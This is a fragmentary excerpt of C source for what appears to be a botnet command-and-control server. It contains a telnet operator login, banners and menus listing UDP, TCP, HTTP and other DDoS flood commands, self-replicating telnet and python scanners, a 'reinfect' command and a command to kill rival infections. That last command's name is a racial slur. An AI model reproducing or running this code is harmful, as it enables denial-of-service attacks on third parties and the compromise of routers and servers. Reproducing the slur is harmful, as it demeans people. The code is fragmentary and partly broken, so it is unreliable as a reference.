...
static int create_and_bind (char *port)
{
        ...
        if (rp == NULL)
        {
                fprintf (stderr, "An error has occured. Please reboot your server\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
...
void *titleWriter(void *sock) 
{
		...
		sprintf(string, "%c]0; [+] Stripers: %d [+]  [+] Users: %d [+]%c", '\033', clientsConnected(), managesConnected, '\007');
...
void *telnetWorker(void *sock)
{
        ...
        if(send(thefd, "\x1b[35mUser:\x1b[35m ", 16, MSG_NOSIGNAL) == -1) goto end;
        ...
        if(send(thefd, "\x1b[37m*  Incorrect Credentials!         *\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, "\x1b[37m*    This has been logged         *\r\n", 44, MSG_NOSIGNAL) == -1) goto end;
		...
		char dope6 [80];
		char dope7 [80];
		sprintf(dope1, "[+] DDOS | Succesfully Logged In |\r\n");
		sprintf(dope2, "[+] DDOS | Self-Rep Is Deployed |\r\n");
		sprintf(dope3, "[+] DDOS | 5GBPS Per Attack |\r\n");
		sprintf(dope4, "[+] DDOS | Removing All Logs Of You |\r\n");
		sprintf(dope5, "[+] DDOS | Spoofing Network |\r\n");
		sprintf(dope6, "[+] DDOS | Setting Up Virtual Terminal |\r\n");
		sprintf(dope7, "\x1b[1;35m[+] DDOS | Loading The BoatNet |\r\n");
		...
		sleep(2);
		if(send(thefd, dope2, strlen(dope2), MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		if(send(thefd, dope3, strlen(dope3), MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		if(send(thefd, dope4, strlen(dope4), MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		if(send(thefd, dope5, strlen(dope5), MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		if(send(thefd, dope6, strlen(dope6), MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		if(send(thefd, dope7, strlen(dope7), MSG_NOSIGNAL) == -1) goto end;
		sleep(5);
		goto fak;
        ...
        char line8 [999];
		char line9 [999];
        sprintf(line1, "\x1b[0;32m  `7MMF'  `7MMF'               `7MM                          \r\n");
		sprintf(line2, "\x1b[0;32m    MM      MM                   MM                       \r\n");
		sprintf(line3, "\x1b[0;32m    MM      MM   ,6'Yb.  ,p6'bo  MM  ,MP'.gP'Ya `7Mb,od8     \r\n");
		sprintf(line4, "\x1b[0;32m    MMmmmmmmMM  8)   MM 6M'  OO  MM ;Y  ,M'   Yb  MM'         \r\n");
		sprintf(line5, "\x1b[0;32m    MM      MM   ,pm9MM 8M       MM;Mm  8Mmmmmmm  MM        \r\n");
		sprintf(line6, "\x1b[0;32m    MM      MM  8M   MM YM.    , MM `Mb.YM.    ,  MM    \r\n");
		sprintf(line7, "\x1b[0;32m  .JMML.  .JMML.`Moo9^Yo.YMbmd'.JMML. YA.`Mbmmd'.JMML.    \r\n");
        sprintf(line8, "\r\n\x1b[0;32m   | Welcome \x1b[0;35m %s\x1b[0;32m To The Strip Club |\r\n", accounts[find_line].id, buf);
		sprintf(line9, "\x1b[0;32m  \x1b[0;32m     | Type HELP To See Commands |\x1b[1;32m\r\n\r\n");
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		...
		while(1) {
		if(send(thefd, "\x1b[1;32m~> \x1b[1;32m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
	    ...
	    if(strstr(buf, "TIME"))
		{  
    	sprintf(botnet, "you go past 3600 seconds and your ass is fried ~Users\r\n");
	    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
	    if(strstr(buf, "RULES"))
		{  
		...
		if(strstr(buf, "!* TCP"))
		{  
		sprintf(botnet, "WOOPS THE Stripers JUST DROPPED THAT SHIT [TCP]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* UDP"))
		{  
		sprintf(botnet, "WOOPS THE GODS JUST DROPPED THAT SHIT [UDP]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* STD"))
		{  
		sprintf(botnet, "WOOPS THE GIANTS JUST DROPPED THAT SHIT [STD]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "!* CNC"))
		{  
		sprintf(botnet, "WOOPS THE Stripers JUST DROPPED THAT SHIT [CNC]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		if(strstr(buf, "INFO"))
		{  
		sprintf(botnet, "This server side is based on greek mythology.\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
		if(strstr(buf, "!* HTTP"))
		{  
		sprintf(botnet, "WOOPS THE GIANTS JUST DROPPED THAT SHIT [HTTP]\r\n");
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	    if(strstr(buf, "ports"))
		{  
		...
		if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			...
			if(strstr(buf, "HELP")) {
				...
				sprintf(helpline1,  "\x1b[0;32mType An Option:\r\n");
				sprintf(helpline2,  "\x1b[1;37m[\x1b[35mDDOS\x1b[1;37m] ~ Shows all commands for DDoS Attacks\r\n");
				sprintf(helpline3,  "\x1b[1;37m[\x1b[32mEXTRA\x1b[1;37m] ~ Shows a list of all extra commands\r\n");
				sprintf(helpline4,  "\x1b[1;37m[\x1b[35mSELF-REP\x1b[1;37m] ~ Don't Touch This!!!\r\n");;
				...
				pthread_create(&title, NULL, &titleWriter, sock);
				if(send(thefd, "\x1b[1;32m~> \x1b[0;36m", 13, MSG_NOSIGNAL) == -1) goto end;
				continue;
		}
					if(strstr(buf, "DDOS")) {
				pthread_create(&title, NULL, &titleWriter, sock);
				...
				sprintf(ddosline1, "\x1b[32m !* UDP [IP] [PORT] [TIME] 32 1024 1 --------| UDP FLOOD\r\n");
				sprintf(ddosline2, "\x1b[35m !* TCP [IP] [PORT] [TIME] 32 all 1024 1 ----| TCP FLOOD\r\n");
				sprintf(ddosline3, "\x1b[32m !* HTTP [URL] G|H|P [PORT] / [TIME] 1024 ---| L7 FLOOD\r\n");
				sprintf(ddosline4, "\x1b[35m !* SPOOF [IP] [PORT] -----------------------| Spoof Tester\r\n");
				sprintf(ddosline5, "\x1b[32m !* VIEWPAGE [URL] --------------------------| VIEWS A PAGE\r\n");
				sprintf(ddosline6, "\x1b[35m !* STD [IP] [PORT] [TIME] ------------------| STD FLOOD\r\n");
				sprintf(ddosline7, "\x1b[32m !* CNC [IP] [PORT] [TIME] ------------------| CNC FLOOD\r\n");
				sprintf(ddosline8, "\x1b[35m !* STOP ------------------------------------| STOPS ALL ATTACKS\r\n");
			...
			if(strstr(buf, "SELF-REP")) {
				...
				sprintf(repline1,  "\x1b[32m !* TELSCAN ON | OFF------------| TURNS ON/OFF TELNET SELFREP\r\n");
				sprintf(repline2,  "\x1b[35m !* UPDATE----------------------| REINFECTS BOT\r\n");
				sprintf(repline3,  "\x1b[32m !* PYTHON 1|2|3|DOWNLOAD|OFF---| TURNS ON/OFF PYTHON SCANNER\r\n");
				sprintf(repline4,  "\x1b[35m !* NIGGERKILL------------------| KILLS OTHERS INFECTIONS\r\n");
			...
			if(strstr(buf, "EXTRA")) {
				...
				sprintf(extraline2,  "\x1b[32m BOTS----| BOT COUNT\r\n");
				sprintf(extraline3,  "\x1b[35m CLEAR---| CLEARS SCREEN\r\n");
				sprintf(extraline4,  "\x1b[32m RULES---| SHOWS RULES\r\n");
				sprintf(extraline5,  "\x1b[35m TIME----| SHOWS MAX BOOT TIME\r\n");
				sprintf(extraline6,  "\x1b[32m INFO----| SHOWS INFO ABOUT THIS SERVERSIDE\r\n");
		...
		goto end;
     			...
     			trim(buf);
                if(send(thefd, "\x1b[1;32m~> \x1b[36m ", 11, MSG_NOSIGNAL) == -1) goto end;
...
int main (int argc, char *argv[], void *sock)
{
		...
		port = atoi(argv[3]);
		printf("\x1b[32mErebus has now woken from his nap. He is charged and ready to fry some routers\n");
